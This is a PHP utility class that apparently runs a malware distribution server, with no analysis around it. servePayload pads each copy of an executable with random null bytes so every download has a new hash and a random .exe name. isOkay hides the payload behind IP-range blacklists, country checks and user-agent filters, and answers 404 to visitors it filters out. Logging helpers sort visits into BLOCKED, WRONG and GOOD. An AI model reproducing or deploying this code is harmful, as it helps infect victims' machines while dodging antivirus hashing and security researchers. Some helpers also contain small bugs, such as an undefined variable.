<?php

class utils {
  function Alphanumeric($length) {
    $pool = array_merge(range(0,9), range('a', 'z'), range('A', 'Z'));

    $blob = '';
    for ($i = 0; $i < $length; $i++) {
      $blob .= $pool[mt_rand(0, count($pool) - 1)];
    }

    return $blob;
  }

  function writeDebugLog($workingDir, $data) {
    $logFname = './' . $workingDir . '/debug.log';

    if (!file_exists($logFilename)) {
      fopen($logFname, "w");
      fclose($logFname);
    }

    $fHandle = file_put_contents($logFname, $data.PHP_EOL, FILE_APPEND | LOCK_EX);
  }

  function createLog($workingDir) {
    $logFname = './' . $workingDir . '/access.log';

    if (!file_exists($logFname)) {
      fopen($logFname, "w");
      fclose($logFname);
    }

  }

  function writeLog($workingDir, $ip, $countryCode, $ua, $fName, $srvWrong, $ok) {
    $logFname = './' . $workingDir . '/access.log';

    if (is_null($fName)) {
      $blob = 'BLOCKED,' . $ip . ',' . $countryCode . ',' . $ua;
    } elseif ($srvWrong == TRUE && $ok == FALSE) {
      $blob = 'WRONG,' . $ip . ',' . $countryCode . ',' . $ua . ',' . $fName . '.exe';
    } else {
      $blob = 'GOOD,' . $ip . ',' . $countryCode . ',' . $ua . ',' . $fName . '.exe';
    }

    $fHandle = file_put_contents($logFname, $blob.PHP_EOL, FILE_APPEND | LOCK_EX);
  }

  function matchCidr($ip, $cidr) {
    list($subnet, $mask) = explode('/', $cidr);

    if ((ip2Long($ip) & ~((1 << (32 - $mask)) - 1)) == ip2long($subnet)) {
      return TRUE;
    } else {
      return FALSE;
    }

  }

  function copyAppend($fname, $workingDir, $blobLength, $outname, $extension) {
    $fullOutPath = './' . $workingDir . '/' . $outname . '.' . $extension;
    copy($fname, $fullOutPath);

    $blob = '';
    for ($i = 0; $i < $blobLength; $i++) {
      $blob .= "\x00";
    }

    $fHandle = fopen($fullOutPath, 'ab+');
    fwrite($fHandle, $blob);
    fclose($fHandle);
  }

  function cleanUp($workingDir, $fName) {
    $archiveDir = './' . $workingDir . '/archive';
    if (!is_dir($archiveDir)) {
      mkdir($archiveDir, 0755, true);
    }

    $oldPath = './' . $workingDir . '/' . $fName . '.exe';
    $newPath = $archiveDir . '/' . $fName . '.exe';
    rename($oldPath, $newPath);
  }

  function servePayload($workingDir, $payload, $svr) {
    $utils = new utils;
    $malFname = $utils->Alphanumeric(rand(5, 25));

    $utils->copyAppend('./' . $workingDir . '/' . $payload, $workingDir, rand(5, 512), $malFname, 'exe');
    $fileLocation = './' . $workingDir . '/' . $malFname . '.exe';

    header('Content-Type: application/octet-stream');
    header('Content-Transfer-Encoding: Binary');
    header("Content-disposition: attachment; filename=\"" . $malFname . ".exe\"");
    readfile($fileLocation);

    return $malFname;
  }

  function isOkay($rhost, $ip_blacklist, $countryCode, $region, $uaFound, $srvWrong) {
    $utils = new utils;
    $matched = FALSE;
    foreach($ip_blacklist as $val) {
      if (stristr($val, "/")) {
        $matched = $utils->matchCidr($rhost, $val);
      }
    }

    if ($srvWrong == FALSE) {
	    if ($matched == TRUE) {
	      header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
	    } elseif ($countryCode != $region) {
	      header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
	    } elseif ($uaFound == TRUE) {
	      header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
	    } else {
	        return TRUE;
	    }
    } else {
      if ($matched == TRUE) {
        return FALSE;
      } elseif ($countryCode != $region) {
        return FALSE;
      } elseif ($uaFound == TRUE) {
        return FALSE;
      } else {
        return TRUE;
      }
    }
  }

}

?>
